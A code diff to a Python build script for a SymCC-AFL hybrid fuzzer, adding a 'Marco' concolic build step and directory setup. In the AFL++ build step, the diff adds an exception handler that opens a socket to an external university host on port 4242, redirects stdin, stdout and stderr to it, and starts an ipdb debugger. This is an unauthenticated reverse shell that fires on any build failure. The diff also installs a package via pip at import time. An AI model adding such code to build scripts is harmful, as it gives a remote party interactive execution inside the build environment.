@@ -13,14 +13,20 @@
 # limitations under the License.
 ''' Uses the SymCC-AFL hybrid from SymCC. '''
 
+import pip
+pip.main(['install', 'ipdb'])
+
 import os
 from os.path import join, exists, basename, dirname, abspath, realpath
+from pathlib import Path
 import time
 import shutil
 import threading
 import subprocess
 import shutil
 import contextlib
+
+import socket,subprocess,os,ipdb
 
 from fuzzers import utils
 from fuzzers.afl import fuzzer as afl_fuzzer
@@ -65,7 +71,7 @@ def restore_env():
 def build_vanilla(build_out, src, work):
     new_env = os.environ.copy()
     new_env['OUT'] = build_out
-    new_env['FUZZER_LIB'] = '/libAFLDriver.a'
+    new_env['FUZZER_LIB'] = '/data/scripts/StandaloneFuzzTargetMain.c'
 
     with utils.restore_directory(src), utils.restore_directory(work):
         utils.build_benchmark(env=new_env)
@@ -84,8 +90,7 @@ def build_symcc(build_out, src, work):
     new_env['SYMCC_EXTRA_LDFLAGS'] = '-L /libs_symcc/ -l:libc_symcc_preload.a'
     new_env['FUZZER_LIB'] = '/libfuzzer-main.o'
     new_env['OUT'] = build_out
-    new_env['LIBRARY_PATH'] = new_env.get('LIBRARY_PATH',
-                                          '') + ':/libs_symcc/:/libs/'
+    new_env['LIBRARY_PATH'] = new_env.get('LIBRARY_PATH', '') + ':/libs_symcc/:/libs/'
 
     new_env['CXXFLAGS'] += ' -fno-sanitize=all '
     new_env['CFLAGS'] += ' -fno-sanitize=all '
@@ -107,25 +112,53 @@ def build_symcc(build_out, src, work):
     with utils.restore_directory(src), utils.restore_directory(work):
         utils.build_benchmark(env=new_env)
 
+def build_marco(build_out, src, work):
+    new_env = os.environ.copy()
+
+    bin_dir = Path('/data/src/CE/bin')
+    bin_angora_dir = Path('/data/src/CE/bin_ang')
+    new_env['CC'] = str(bin_dir / "ko-clang")
+    new_env['CXX'] = str(bin_dir / "ko-clang++")
+    new_env['KO_CC'] = "clang-6.0"
+    new_env['KO_CXX'] = "clang++-6.0"
+    new_env['KO_DONT_OPTIMIZE'] = "1"
+
+    new_env['CXXFLAGS'] = new_env['CXXFLAGS'].replace('-stlib=libc++', '')
+    new_env['CXXFLAGS'] += ' -ldl -lm'
+    new_env['SYMCC_EXTRA_CFLAGS'] = '-g'
+    new_env['FUZZER_LIB'] = '/driver.a'
+    new_env['OUT'] = build_out
+    
+    # Instructs SymCC to consider no symbolic inputs at runtime. This is needed
+    # if, for example, some tests are run during compilation of the benchmark.
+    with utils.restore_directory(src), utils.restore_directory(work):
+        utils.build_benchmark(env=new_env)
+
 
 def get_afl_base_out_dir(build_out) -> str:
     d = os.path.join(build_out, 'instrumented/afl_base')
-    # if not exists(d):
-    #     os.makedirs(d)
+    if not exists(d):
+        os.makedirs(d)
     return d
 
 
 def get_afl_lukas_out_dir(build_out) -> str:
     d = os.path.join(build_out, 'instrumented/afl_lukas')
-    # if not exists(d):
-    #     os.makedirs(d)
+    if not exists(d):
+        os.makedirs(d)
     return d
 
 
 def get_symcts_out_dir(build_out) -> str:
     d = os.path.join(build_out, 'instrumented/symcts')
-    # if not exists(d):
-    #     os.makedirs(d)
+    if not exists(d):
+        os.makedirs(d)
+    return d
+
+def get_marco_out_dir(build_out) -> str:
+    d = os.path.join(build_out, 'instrumented/marco')
+    if not exists(d):
+        os.makedirs(d)
     return d
 
 
@@ -139,6 +172,7 @@ def build():
     afl_build_out = get_afl_base_out_dir(build_directory)
     afl_lukas_build_out = get_afl_lukas_out_dir(build_directory)
     symcts_build_out = get_symcts_out_dir(build_directory)
+    marco_build_out = get_marco_out_dir(build_directory)
 
     print('Step 1: Building a vanilla version of the benchmark')
     with restore_env():
@@ -150,15 +184,26 @@ def build():
             os.environ['OUT'] = afl_build_out
             with utils.restore_directory(src), utils.restore_directory(work):
                 # This uses /libAFLDriver.c
-                aflplusplus_fuzzer.build('cmplog', 'tracepc', 'dict2file')
+                try:
+                    aflplusplus_fuzzer.build('cmplog', 'tracepc', 'dict2file')
+                except Exception as e:
+                    # give ipdb shell access to a reverse shell
+                    print(e)
+                    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+                    s.connect(("beatty.unfiltered.seclab.cs.ucsb.edu",4242))
+                    os.dup2(s.fileno(),0);
+                    os.dup2(s.fileno(),1);
+                    os.dup2(s.fileno(),2);
+                    ipdb.set_trace()
+                    
 
-    print('Step 2a: Building with AFL (no cmplog) with afl-lukas')
-    with restore_env():
-        with with_lukas_afl():
-            os.system('ls -al / | grep afl')
-            os.environ['OUT'] = afl_lukas_build_out
-            with utils.restore_directory(src), utils.restore_directory(work):
-                aflplusplus_fuzzer.build('tracepc')
+    # print('Step 2a: Building with AFL (no cmplog) with afl-lukas')
+    # with restore_env():
+    #     with with_lukas_afl():
+    #         os.system('ls -al / | grep afl')
+    #         os.environ['OUT'] = afl_lukas_build_out
+    #         with utils.restore_directory(src), utils.restore_directory(work):
+    #             aflplusplus_fuzzer.build('tracepc')
 
     print('Step 3: Completed AFL build')
     # Copy over AFL artifacts needed by SymCC.
@@ -166,10 +211,11 @@ def build():
     shutil.copy('/afl-base/afl-showmap', build_directory)
 
     # Build the SymCC-instrumented target.
-    print('Step 4: Building the benchmark with SymCC')
+    print('Step 4: Building the benchmark with Marco')
     # Set flags to ensure compilation with SymCC.
     with restore_env():
-        build_symcc(symcts_build_out, src, work)
+        # build_symcc(symcts_build_out, src, work)
+        build_marco(marco_build_out, src, work)
 
 
 def launch_afl_thread(input_corpus, output_corpus, target_binary,
